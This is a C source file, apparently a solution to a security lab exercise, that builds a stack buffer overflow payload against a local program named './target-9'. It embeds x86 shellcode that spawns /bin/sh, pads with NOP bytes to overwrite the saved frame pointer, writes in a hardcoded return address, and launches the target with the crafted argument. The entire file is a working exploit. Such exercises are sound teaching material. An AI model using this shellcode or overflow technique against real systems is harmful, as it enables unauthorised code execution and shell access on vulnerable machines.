#include "stdio.h"
#include "stdlib.h"
#include "string.h"
#include "unistd.h"
static char shellcode[] = ""
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
static char return_address []=  "\x60\xfb\xff\xbf";
int main(){
	char *buffer = malloc(255);
	char *args[] = {"./target-9", buffer};
	int i;

	// Overwrite buffer
	strncat(args[1], "\x90", 1);
	strncat(args[1], "\x90", 1);
	strncat(args[1], "\x90", 1);
	strncat(args[1], "\x90", 1);
	// Overwrite FramePointer
	strncat(args[1], "\x90", 1);
	strncat(args[1], "\x90", 1);
	strncat(args[1], "\x90", 1);
	strncat(args[1], "\x90", 1);
	// Overwrite Return Address
	strncat(args[1], return_address, 4); 
	for(i = 0; i <= 255 - strlen(shellcode)-1; i++){
		strncat(args[1], "\x90", 1);
	}
	strncat(args[1], shellcode, strlen(shellcode));



	execl(args[0],args[0], args[1], NULL);
	return 0;
}
